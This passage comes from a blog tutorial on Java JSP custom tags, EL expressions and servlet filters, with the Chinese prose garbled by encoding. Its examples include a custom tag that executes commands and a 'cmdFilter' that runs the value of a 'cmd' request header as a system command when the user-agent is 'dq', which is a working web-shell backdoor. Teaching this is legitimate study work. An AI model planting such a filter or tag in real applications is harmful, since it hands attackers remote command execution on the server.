class="params">(String cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setShow</span><span class="params">(<span class="keyword">boolean</span> show)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.show = show;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.cmd == <span class="keyword">null</span>)&#123;</span><br><span class="line">            getJspBody().invoke(sw);</span><br><span class="line">            <span class="keyword">this</span>.cmd = <span class="keyword">this</span>.sw.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        String line;</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(java.lang.Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd).getInputStream(),<span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">            sb.append(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.show)&#123;</span><br><span class="line">            getJspContext().getOut().write(sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‰“åŒ…æˆ <code>jar</code> ï¼Œæ”¾å…¥æŒ‡å®šç›®å½•ä¸­ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232033578.png" alt="image-20220223203359367"></p>
<p>å†å†™å…¥ <code>tld</code> æ–‡ä»¶ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">jsp-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>c_t<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>execute<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag-class</span>&gt;</span>custom.cmd<span class="tag">&lt;/<span class="name">tag-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body-content</span>&gt;</span>scriptless<span class="tag">&lt;/<span class="name">body-content</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">attribute</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">required</span>&gt;</span>false<span class="tag">&lt;/<span class="name">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>java.lang.String<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">attribute</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>show<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">required</span>&gt;</span>false<span class="tag">&lt;/<span class="name">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šå†…å®¹æ˜¯ç»™è¿™ä¸ªæ ‡ç­¾è§„å®šäº† <code>2</code> ä¸ªå±æ€§ï¼Œåˆ†åˆ«ä¸º <code>cmd</code> å’Œ <code>show</code> (è¿™ä¸¤ä¸ªå±æ€§éå¼ºåˆ¶è¦æ±‚èµ‹å€¼)ï¼Œå…¶ä¸­ <code>cmd</code> å±æ€§ç±»å‹è¢«è§„å®šä¸º <code>String</code> å‹ï¼Œç”¨ä½œè¾“å…¥å‘½ä»¤ï¼Œè€Œ <code>show</code> å±æ€§ç±»å‹è¢«è§„å®šä¸º <code>boolean</code> å‹ï¼Œåˆ¤æ–­æ˜¯å¦å°†å‘½ä»¤æ‰§è¡Œç»“æœå›æ˜¾ï¼›å¹¶ä¸”å¯æ”¯æŒå°†å†…åµŒå†…å®¹ä¼ å…¥ <code>cmd</code> å±æ€§ã€‚</p>
<p>åœ¨ <code>web.xml</code> ä¸­å¼•å…¥ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232023547.png" alt="image-20220223202302473"></p>
<p>ç„¶åå°†ä»¥ä¸‹å†…å®¹å†™å…¥ <code>tag.jsp</code> æ–‡ä»¶ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;cmd&quot;</span> uri=<span class="string">&quot;//localhost/custom_tag/cmd&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;TAG&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;cmd:execute cmd=<span class="string">&quot;echo \&quot;å±æ€§\&quot;&quot;</span> show=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">&lt;cmd:execute show=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">    echo <span class="string">&quot;å†…åµŒ&quot;</span></span><br><span class="line">&lt;/cmd:execute&gt;</span><br><span class="line">&lt;cmd:execute cmd=<span class="string">&quot;echo \&quot;å±æ€§,ä¸æ˜¾ç¤º\&quot;&quot;</span> show=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">&lt;cmd:execute show=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">    echo <span class="string">&quot;å†…åµŒï¼Œä¸æ˜¾ç¤º&quot;</span></span><br><span class="line">&lt;/cmd:execute&gt;</span><br><span class="line">&lt;cmd:execute cmd=<span class="string">&quot;calc.exe&quot;</span> show=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232035595.png" alt="image-20220223203528491"></p>
<h4 id="ELè¡¨è¾¾å¼">- ELè¡¨è¾¾å¼ -</h4>
<p><code>jsp</code> è¡¨è¾¾å¼è¯­è¨€å³ <code>JSP EL</code> ä½¿å¾—è®¿é—®å­˜å‚¨åœ¨å„å¼å„æ · <code>javaBean</code> ä¸­çš„æ•°æ®å˜å¾—ç®€å•ï¼Œå…¶æ—¢å¯ä»¥ç”¨æ¥åˆ›å»ºç®—æœ¯è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥åˆ›å»ºé€»è¾‘è¡¨è¾¾å¼ã€‚</p>
<p>ç®€å•çš„è¯­æ³•å¦‚ä¸‹ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;[è¡¨è¾¾å¼å†…å®¹]&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ <code>JSP EL</code> ä¸­çš„é€šç”¨æ“ä½œç¬¦ä¸º <code>.</code> å’Œ <code>[]</code>ï¼Œæ¯”å¦‚æƒ³ç”¨ <code>jsp</code> æ ‡ç­¾æŒ‡å®š <code>x</code> çš„ <code>length</code> å±æ€§çš„å€¼ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:setProperty name=<span class="string">&quot;x&quot;</span> property=<span class="string">&quot;length&quot;</span> value=<span class="string">&quot;100&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>ä½†è¿™ä¸ª <code>length</code> å±æ€§æ˜¯éœ€è¦åŠ¨æ€å˜åŒ–çš„ï¼Œè¿™æ—¶å°±å¯ä»¥ç”¨åˆ° <code>JSP EL</code> äº†ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:setProperty name=<span class="string">&quot;x&quot;</span> property=<span class="string">&quot;length&quot;</span> value=<span class="string">&quot;$&#123;param[&#x27;a&#x27;]+param[&#x27;b&#x27;]&#125;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šçš„æ„æ€æ˜¯å°†è¯·æ±‚å‚æ•° <code>a</code> å’Œ <code>b</code> å€¼ç›¸åŠ å¾—åˆ°çš„ç»“æœèµ‹å€¼ç»™ <code>x</code> çš„ <code>length</code> å±æ€§ã€‚</p>
<p>è‹¥æƒ³è¦åœç”¨ <code>JSP EL</code> ï¼Œå¯ä»¥åœ¨å¼€å¤´å†™å…¥ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored =<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸‹æ˜¯æœ‰å…³ <code>JSP EL</code> çš„æ“ä½œç¬¦(æ‘˜è‡ª<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-expression-language.html">jspè¡¨è¾¾å¼è¯­è¨€</a>)ğŸ‘‡</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>æ“ä½œç¬¦</strong></th>
<th style="text-align:left"><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">.</td>
<td style="text-align:left">è®¿é—®ä¸€ä¸ª<code>Bean</code>å±æ€§æˆ–è€…ä¸€ä¸ªæ˜ å°„æ¡ç›®</td>
</tr>
<tr>
<td style="text-align:left">[]</td>
<td style="text-align:left">è®¿é—®ä¸€ä¸ªæ•°ç»„æˆ–è€…é“¾è¡¨çš„å…ƒç´ </td>
</tr>
<tr>
<td style="text-align:left">( )</td>
<td style="text-align:left">ç»„ç»‡ä¸€ä¸ªå­è¡¨è¾¾å¼ä»¥æ”¹å˜ä¼˜å…ˆçº§</td>
</tr>
<tr>
<td style="text-align:left">+</td>
<td style="text-align:left">åŠ </td>
</tr>
<tr>
<td style="text-align:left">-</td>
<td style="text-align:left">å‡æˆ–è´Ÿ</td>
</tr>
<tr>
<td style="text-align:left">*</td>
<td style="text-align:left">ä¹˜</td>
</tr>
<tr>
<td style="text-align:left">/ or div</td>
<td style="text-align:left">é™¤</td>
</tr>
<tr>
<td style="text-align:left">% or mod</td>
<td style="text-align:left">å–æ¨¡</td>
</tr>
<tr>
<td style="text-align:left">== or eq</td>
<td style="text-align:left">æµ‹è¯•æ˜¯å¦ç›¸ç­‰</td>
</tr>
<tr>
<td style="text-align:left">!= or ne</td>
<td style="text-align:left">æµ‹è¯•æ˜¯å¦ä¸ç­‰</td>
</tr>
<tr>
<td style="text-align:left">&lt; or lt</td>
<td style="text-align:left">æµ‹è¯•æ˜¯å¦å°äº</td>
</tr>
<tr>
<td style="text-align:left">&gt; or gt</td>
<td style="text-align:left">æµ‹è¯•æ˜¯å¦å¤§äº</td>
</tr>
<tr>
<td style="text-align:left">&lt;= or le</td>
<td style="text-align:left">æµ‹è¯•æ˜¯å¦å°äºç­‰äº</td>
</tr>
<tr>
<td style="text-align:left">&gt;= or ge</td>
<td style="text-align:left">æµ‹è¯•æ˜¯å¦å¤§äºç­‰äº</td>
</tr>
<tr>
<td style="text-align:left">&amp;&amp; or and</td>
<td style="text-align:left">æµ‹è¯•é€»è¾‘ä¸</td>
</tr>
<tr>
<td style="text-align:left">|| or or</td>
<td style="text-align:left">æµ‹è¯•é€»è¾‘æˆ–</td>
</tr>
<tr>
<td style="text-align:left">! or not</td>
<td style="text-align:left">æµ‹è¯•å–å</td>
</tr>
<tr>
<td style="text-align:left">empty</td>
<td style="text-align:left">æµ‹è¯•æ˜¯å¦ç©ºå€¼</td>
</tr>
</tbody>
</table>
<p>å½“ç„¶ï¼Œåœ¨ <code>JSP EL</code> ä¸­ä½¿ç”¨æ ‡ç­¾åº“å®šä¹‰çš„å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯”å¦‚ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;fn&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/functions&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">    $&#123;fn:toLowerCase(<span class="string">&quot;A&quot;</span>)&#125;</span><br><span class="line">    $&#123;fn:toUpperCase(<span class="string">&quot;a&quot;</span>)&#125;</span><br><span class="line">    $&#123;fn:join(fn:split(<span class="string">&quot;a b c d e f&quot;</span>,<span class="string">&quot; &quot;</span>),<span class="string">&quot;|&quot;</span>)&#125;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232110575.png" alt="image-20220223211009460"></p>
<p>åŒæ—¶ <code>JSP EL</code> è¿˜æ”¯æŒä¸‹åˆ—çš„éšå«å¯¹è±¡(æ‘˜è‡ª<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-expression-language.html">jspè¡¨è¾¾å¼è¯­è¨€</a>)ğŸ‘‡</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>éšå«å¯¹è±¡</strong></th>
<th style="text-align:left"><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">pageScope</td>
<td style="text-align:left">page ä½œç”¨åŸŸ</td>
</tr>
<tr>
<td style="text-align:left">requestScope</td>
<td style="text-align:left">request ä½œç”¨åŸŸ</td>
</tr>
<tr>
<td style="text-align:left">sessionScope</td>
<td style="text-align:left">session ä½œç”¨åŸŸ</td>
</tr>
<tr>
<td style="text-align:left">applicationScope</td>
<td style="text-align:left">application ä½œç”¨åŸŸ</td>
</tr>
<tr>
<td style="text-align:left">param</td>
<td style="text-align:left">Request å¯¹è±¡çš„å‚æ•°ï¼Œå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td style="text-align:left">paramValues</td>
<td style="text-align:left">Requestå¯¹è±¡çš„å‚æ•°ï¼Œå­—ç¬¦ä¸²é›†åˆ</td>
</tr>
<tr>
<td style="text-align:left">header</td>
<td style="text-align:left">HTTP ä¿¡æ¯å¤´ï¼Œå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td style="text-align:left">headerValues</td>
<td style="text-align:left">HTTP ä¿¡æ¯å¤´ï¼Œå­—ç¬¦ä¸²é›†åˆ</td>
</tr>
<tr>
<td style="text-align:left">initParam</td>
<td style="text-align:left">ä¸Šä¸‹æ–‡åˆå§‹åŒ–å‚æ•°</td>
</tr>
<tr>
<td style="text-align:left">cookie</td>
<td style="text-align:left">Cookieå€¼</td>
</tr>
<tr>
<td style="text-align:left">pageContext</td>
<td style="text-align:left">å½“å‰é¡µé¢çš„pageContext</td>
</tr>
</tbody>
</table>
<p>è¿™æ ·å°±ä¸€ç›®äº†ç„¶äº†ï¼Œæ¯”æ–¹è¯´ä¸Šé¢çš„ <code>$&#123;param['a']+param['b']&#125;</code> å³æ˜¯è·å–ä¼ å…¥å‚æ•° <code>a</code> å’Œ <code>b</code> ä¹‹å’Œã€‚</p>
<h3 id="è¿‡æ»¤å™¨-filter">- è¿‡æ»¤å™¨(filter) -</h3>
<p>è¿‡æ»¤å™¨å³ <code>filter</code> åœ¨ <code>servlet</code> å’Œ <code>jsp</code> ä¸­éƒ½æ˜¯ <code>Java</code> ç±»ï¼Œåœ¨è¯·æ±‚è®¿é—®åç«¯èµ„æºå‰ç”¨ä»¥å¤„ç† <code>ServletRequest</code> å’Œ <code>ServletResponse</code> ï¼Œå¯ä»¥ç†è§£ä¸ºä¸­é—´ä»¶ã€‚ä¸€èˆ¬å¸¸ç”¨çš„è¿‡æ»¤å™¨ç±»å‹å¦‚ä¸‹ğŸ‘‡</p>
<ul>
<li>è®¤è¯è¿‡æ»¤å™¨</li>
<li>æ•°æ®å‹ç¼©è¿‡æ»¤å™¨</li>
<li>åŠ å¯†è¿‡æ»¤å™¨</li>
<li>è§¦å‘èµ„æºè®¿é—®äº‹ä»¶è¿‡æ»¤å™¨</li>
<li>å›¾å½¢è½¬æ¢è¿‡æ»¤å™¨</li>
<li>ç™»å½•å’ŒéªŒè¯è¿‡æ»¤å™¨</li>
<li>MIMEç±»å‹é“¾è¿‡æ»¤å™¨</li>
<li>ä»¤ç‰Œè¿‡æ»¤å™¨</li>
<li>è½¬æ¢XMLå†…å®¹çš„XSL/Tè¿‡æ»¤å™¨</li>
</ul>
<p>è¿‡æ»¤å™¨å’Œ <code>servlet</code> åœ¨ <code>web.xml</code> çš„é…ç½®å·®ä¸å¤šéƒ½å…ˆéœ€è¦ä¸€ä¸ªæ ‡ç­¾å¦‚ <code>&lt;filter&gt;</code> æŒ‡æ˜åç§°å’Œåº”ç”¨çš„è¿‡æ»¤ç±»ï¼Œå†ç”¨ <code>&lt;filter-mapping&gt;</code> ä½¿ç”¨ <code>url</code> æ­£åˆ™åŒ¹é…æˆ–å¯¹æŒ‡å®š <code>servlet</code> ç”Ÿæ•ˆæ¨¡å¼ã€‚</p>
<h4 id="ä»£ç -2">- ä»£ç  -</h4>
<p>å¦‚æœè¦å†™ä¸€ä¸ªè¿‡æ»¤å™¨å°±å¾—å®ç° <code>javax.servlet.Filter</code> æ¥å£ï¼Œåœ¨ <code>javax.servlet.Filter</code> æ¥å£ä¸­å®šä¹‰äº†ä»¥ä¸‹æ–¹æ³•ğŸ‘‡</p>
<ul>
<li><code>default public void init(FilterConfig filterConfig) throws ServletException &#123;&#125;</code></li>
<li><code>public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException</code></li>
<li><code>default public void destroy() &#123;&#125;</code></li>
</ul>
<p>å…¶ä¸­ <code>init</code> æ–¹æ³•å’Œ <code>servlet</code> çš„ <code>init</code> æ–¹æ³•å·®ä¸å¤šï¼Œå½“è¿‡æ»¤å™¨è¢«å®ä¾‹åŒ–åä¼šè¢«è°ƒç”¨ï¼Œè€Œ <code>doFilter</code> æ–¹æ³•å³æ˜¯éœ€è¦è¿›è¡Œé‡å†™è‡ªå®šä¹‰è¿‡æ»¤å™¨å¤„ç†æ–¹å¼çš„æ–¹æ³•ï¼Œåé¢çš„ <code>destroy</code> æ–¹æ³•åˆ™æ˜¯å½“ä¸å†éœ€è¦è¿‡æ»¤å™¨æ—¶è¢«è°ƒç”¨ã€‚</p>
<h4 id="è‡ªå®šä¹‰è¿‡æ»¤å™¨">- è‡ªå®šä¹‰è¿‡æ»¤å™¨ -</h4>
<p>ç”±äºè¿‡æ»¤å™¨çš„ <code>doFilter</code> æ–¹æ³•ä¸­ä¼šæ”¶åˆ°ä¸€ä¸ªåä¸º <code>chain</code> çš„ <code>FilterChain</code> ç±»å‹çš„å‚æ•°ï¼Œç›®çš„æ˜¯å°†ç»ä¸Šä¸€æ¬¡è¿‡æ»¤å™¨å¾—åˆ°çš„ <code>request</code> å’Œ <code>response</code> ä¼ é€’è¿‡æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´è¿‡æ»¤å™¨çš„è°ƒç”¨è¿‡ç¨‹å®é™…ä¸Šæ˜¯ä¸€ä¸ªå«æœ‰å¤šä¸ªè¿‡æ»¤å™¨çš„é“¾è¡¨ä¸­å„ä¸ªè¿‡æ»¤å™¨çš„ä¾æ¬¡è°ƒç”¨ã€‚</p>
<p>å½“æ‰§è¡Œå®Œ <code>doFilter</code> æ–¹æ³•ä¸­çš„å¤„ç†è¿‡ç¨‹åï¼Œåˆ«å¿˜äº†åŠ ä¸Šä¸€å¥ <code>filterChain.doFilter(servletRequest,servletResponse)</code> å°† <code>servletRequest</code> å’Œ <code>servletResponse</code> ä¼ é€’ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå¦‚æœæ²¡æœ‰åŠ ä¸Š <code>filterChain.doFilter(servletRequest,servletResponse)</code> å°±ä¼šåœ¨æ­¤ä¸­æ–­(åé¢é¡µé¢çš„å†…å®¹ä¹Ÿä¸ä¼šæ˜¾ç¤º)ã€‚</p>
<h5 id="å•ä¸ªè¿‡æ»¤å™¨">- å•ä¸ªè¿‡æ»¤å™¨ -</h5>
<p>æ¯”å¦‚å†™ä¸€ä¸ªåä¸º <code>cmdFilter</code> çš„è¿‡æ»¤å™¨ï¼ŒåŠŸèƒ½å¦‚ä¸‹ğŸ‘‡</p>
<ul>
<li>å½“åä¸º <code>evil</code> çš„ <code>servlet</code> æˆ– <code>*.jsp</code> é¡µé¢æ¥æ”¶åˆ°å®¢æˆ·è¯·æ±‚æ—¶åˆ¤æ–­å…¶ <code>user-agent</code> æ˜¯å¦ä¸º <code>dq</code></li>
<li>è‹¥ <code>user-agent</code> ä¸º <code>dq</code> åˆ™åˆ¤æ–­æ˜¯å¦å­˜åœ¨ <code>cmd</code> è¯·æ±‚æ ‡å¤´</li>
<li>è‹¥å­˜åœ¨åä¸º <code>cmd</code> çš„è¯·æ±‚æ ‡å¤´åˆ™å°† <code>cmd</code> è¯·æ±‚æ ‡å¤´çš„å€¼å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
<li>å°†æ‰§è¡Œå‘½ä»¤çš„ç»“æœè¿½åŠ åˆ°å“åº”å†…å®¹ä¸­è¿”å›ç»™å®¢æˆ·ç«¯</li>
</ul>
<p>å…ˆè‡ªå®šä¹‰ä¸€ä¸ªå®ç° <code>javax.servlet.Filter</code> æ¥å£çš„ <code>cmdFilter</code> ç±»ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmdFilter</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        Filter.<span class="keyword">super</span>.init(filterConfig);</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">this</span>.userName = filterConfig.getInitParameter(<span class="string">&quot;name&quot;</span>)) == <span class="keyword">null</span> || !<span class="keyword">this</span>.userName.equals(<span class="string">&quot;dq&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">this</span>.userName = <span class="string">&quot;dq&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String ua = ((HttpServletRequest) servletRequest).getHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line">        String cmd = ((HttpServletRequest) servletRequest).getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ua != <span class="keyword">null</span> &amp;&amp; cmd != <span class="keyword">null</span> &amp;&amp; ua.equals(<span class="keyword">this</span>.userName) )&#123;</span><br><span class="line"></span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(java.lang.Runtime.getRuntime().exec(cmd).getInputStream(),<span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">               sb.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            servletResponse.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            servletResponse.getWriter().write(sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
